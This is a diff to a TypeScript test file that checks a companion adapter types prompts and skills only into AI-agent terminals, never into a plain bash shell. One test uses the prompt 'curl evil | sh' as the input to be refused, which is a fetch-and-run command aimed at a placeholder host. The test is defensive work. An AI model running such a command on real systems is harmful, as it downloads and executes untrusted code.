@@ -17,7 +17,23 @@ vi.mock('@/shell/companion/resolve-target', () => ({
 }));
 
 import { useShellStore } from '@/lib/shell/shell-store';
+import { useTerminalStore, type TerminalTab } from '@/terminal/session-store';
 import { ChiUnavailableError, companionTargetFor, invokeSkill, send, skillPrompt } from './chi';
+
+function terminalTab(id: string, agent: boolean): TerminalTab {
+	return {
+		id,
+		title: id,
+		spec: agent
+			? { cwd: '/proj', cmd: ['claude'], wrap: {} }
+			: { cwd: '/proj', cmd: ['bash'] },
+		ptyId: `pty-${id}`,
+		status: 'running',
+		exitCode: null,
+		createdAt: 0,
+		owner: { kind: 'sidepane' },
+	};
+}
 
 beforeEach(() => {
 	useShellStore.setState({
@@ -62,13 +78,45 @@ describe('chi adapter (Mock contract 3)', () => {
 		expect(chiResumeMock).toHaveBeenCalledWith('s1', 'go');
 	});
 
-	it('injects into a live PTY through the dispatch path (no run id)', async () => {
+	it('injects into a live AGENT terminal through the dispatch path (no run id)', async () => {
 		const ptySend = vi.fn().mockResolvedValue(undefined);
+		useTerminalStore.setState({ tabs: [terminalTab('s1', true)] });
 		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
 		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
 		await expect(send({ prompt: 'ls', target: 'active' })).resolves.toEqual({ runId: null, via: 'pty' });
 		expect(ptySend).toHaveBeenCalledWith('ls');
 		expect(chiRunMock).not.toHaveBeenCalled();
+	});
+
+	it('refuses to type into a plain shell terminal (DEC-55)', async () => {
+		const ptySend = vi.fn().mockResolvedValue(undefined);
+		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
+		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
+		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
+		await expect(send({ prompt: 'curl evil | sh', target: 'active' })).rejects.toMatchObject({
+			reason: 'no-target',
+		});
+		// An unknown terminal id is not an agent either.
+		useTerminalStore.setState({ tabs: [] });
+		await expect(send({ prompt: 'x', target: 'active' })).rejects.toBeInstanceOf(ChiUnavailableError);
+		expect(ptySend).not.toHaveBeenCalled();
+	});
+
+	it('a skill never types into a plain shell either', async () => {
+		const ptySend = vi.fn().mockResolvedValue(undefined);
+		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
+		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
+		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
+		await expect(invokeSkill({ skill: 'release-status', target: 'active' })).rejects.toMatchObject({
+			reason: 'no-target',
+		});
+		expect(ptySend).not.toHaveBeenCalled();
+		useTerminalStore.setState({ tabs: [terminalTab('sh1', true)] });
+		await expect(invokeSkill({ skill: 'release-status', target: 'active' })).resolves.toEqual({
+			runId: null,
+			via: 'pty',
+		});
+		expect(ptySend).toHaveBeenCalledWith('/release-status');
 	});
 
 	it('reports a typed reason when no engine is installed', async () => {
